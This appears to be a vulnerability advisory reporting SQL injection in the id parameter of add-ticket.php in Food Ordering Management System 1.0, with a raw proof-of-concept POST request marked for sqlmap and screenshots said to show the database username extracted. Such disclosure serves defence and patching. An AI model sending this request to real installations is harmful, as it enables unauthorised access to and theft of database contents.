##Food Ordering Management System has a front-end SQL injection vulnerability

## Affected version: 
Food Ordering Management System - 1.0

## Software:
https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html

## Vulnerability File:
/foms/routers/add-ticket.php

## Description:
Food Ordering Management  1.0 is vulnerable to an unrestricted SQL injection attack in /foms/routers/add-ticket.php with the attack parameter id. An attacker can exploit this vulnerability to directly obtain sensitive server information. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /foms/routers/add-ticket.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: http://localhost
Connection: close
Referer: http://localhost/foms/register.php
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

type=2dsadsad&id=2dsadsa*&subject=22312&description=21242421312312312
```

Get database username through sqlma

![CleanShot 2024-09-04 at 16 05 07@2x](https://github.com/user-attachments/assets/d2b42765-9301-4603-a091-afef303bcf71)
![CleanShot 2024-09-04 at 16 05 41@2x](https://github.com/user-attachments/assets/1a460942-d900-4af8-b7a4-958c67a95daf)


